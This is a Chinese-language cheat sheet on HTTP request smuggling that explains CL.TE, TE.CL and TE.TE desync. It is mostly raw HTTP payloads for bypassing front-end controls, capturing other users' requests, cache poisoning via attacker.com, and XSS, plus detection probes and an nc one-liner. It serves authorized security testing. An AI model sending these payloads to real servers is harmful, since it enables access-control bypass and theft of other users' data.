# 📦 HTTP 请求走私速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

<a id="-what-is-request-smuggling"></a>
## 🎯 请求走私是什么

**HTTP 请求走私（Request Smuggling）** 利用前端（代理）与后端服务器解析 HTTP 请求时的差异，从而注入额外请求。

### 影响
- 🔴 **绕过安全控制** - 绕过 WAF／访问控制列表（ACL）
- 🔴 **Web 缓存投毒** - 将恶意响应写入缓存
- 🔴 **窃取凭据** - 捕获其他用户的请求
- 🔴 **XSS** - 通过走私请求触发反射型 XSS

---

<a id="-how-it-works"></a>
## 🔍 工作原理

> **协议说明：** [RFC 9112 §6.3](https://www.rfc-editor.org/rfc/rfc9112.html#section-6.3)规定，收到同时包含两种长度头的报文时，Transfer-Encoding 优先，此类歧义应作为错误处理；转发时还必须移除 Content-Length。下表描述的是实现存在解析差异时的漏洞表现，并非合规服务器的正常行为。

### 涉及的请求头
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### 漏洞类型
| 类型 | 前端采用 | 后端采用 |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | 两端面对混淆后的请求头 | 其中一端忽略该请求头 |

---

<a id="-attack-payloads"></a>
## 💉 攻击载荷

> **长度与格式说明：** 所有原文载荷、长度值、分块大小、空格和空行均原样保留，部分片段仅用于示意。按 [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html#section-7.1)，Content-Length 按字节计数，chunk-size 使用十六进制，线上 HTTP/1.1 分隔符为 CRLF；Markdown 中显示的换行并不等于可直接发送的完整报文，原文数值也不保证适用于修改后的内容。

### CL.TE (Content-Length → Transfer-Encoding)

**前端采用 Content-Length，后端采用 Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**利用示例：**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**前端采用 Transfer-Encoding，后端采用 Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE（混淆 Transfer-Encoding）

```http
# 混淆 TE 请求头
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

<a id="-exploitation-examples"></a>
## 🔥 利用示例

### 绕过前端安全控制
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### 捕获其他用户的请求
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*下一位用户的请求会被追加到 `data=`*

### 通过请求走私进行缓存投毒
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### 通过请求走私触发 XSS
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

<a id="-detection"></a>
## 🔍 检测

### 基于响应时间的检测
```http
# CL.TE 测试
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# 如果后端采用 TE，就会等待 "0" 结束块（原文说明，参见下方补充）
# 超时 = 可能存在漏洞
```

> **检测补充：** 在 [PortSwigger 的 CL.TE 时间检测示例](https://portswigger.net/web-security/request-smuggling/finding)中，后端会等待下一个分块，不一定只等待字面值 "0"。单次超时或 404 不能独立确认请求走私，还须验证对后续正常请求的可重复干扰。

### 响应差异检测
```http
# 发送会触发 404 的走私请求
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# 如果下一个响应是 404 = 存在漏洞（原文判断，仍需进一步确认）
```

---

<a id="-tools"></a>
## 🛠️ 工具

### Burp Suite 扩展
```
1. 安装 "HTTP Request Smuggler" 扩展
2. 右键单击请求 → Extensions（扩展）→ Launch Smuggle Probe（启动走私探测）
3. 检查结果中是否存在请求走私漏洞
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

> **界面版本说明：** [扩展官方用法](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)仍通过请求右键菜单启动探测，具体菜单层级和大小写可能随 Burp／扩展版本变化。

### 使用 curl 手动测试

> **命令说明：** 本节标题提到 curl，但下方实际使用 `printf` 与 `nc` 发送明文 TCP 数据，并非 HTTPS 请求；原文命令保持不变。

```bash
# 注意：curl 可能规范化请求头，某些测试可能需要原始 TCP 数据
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

<a id="-quick-reference"></a>
## 📊 速查表

### 检测清单
```markdown
- [ ] 检查是否存在代理／负载均衡器（多台服务器）
- [ ] 测试 CL.TE 响应时间
- [ ] 测试 TE.CL 响应时间
- [ ] 尝试混淆 TE 请求头
- [ ] 通过响应差异进一步验证
```

### 常见线索
```
- 负载均衡器（AWS ALB、HAProxy）
- 反向代理（nginx、Apache）
- 内容分发网络（CDN，如 Cloudflare、Akamai）
- HTTP/2 到 HTTP/1.1 的协议降级
```

---

<a id="-important-notes"></a>
## ⚠️ 重要说明

```
1. 测试可能干扰其他用户
2. 尽可能使用隔离的测试环境
3. 添加唯一标识符，便于识别自己的请求
4. 以负责任的方式提交报告，并附上概念验证（PoC）
```

---

<a id="-resources"></a>
## 📚 参考资源

- [PortSwigger HTTP 请求走私（Request Smuggling）](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Smuggler 工具](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 探索请求走私！</b><br>
  <i>仅限经授权的测试！</i>
</p>
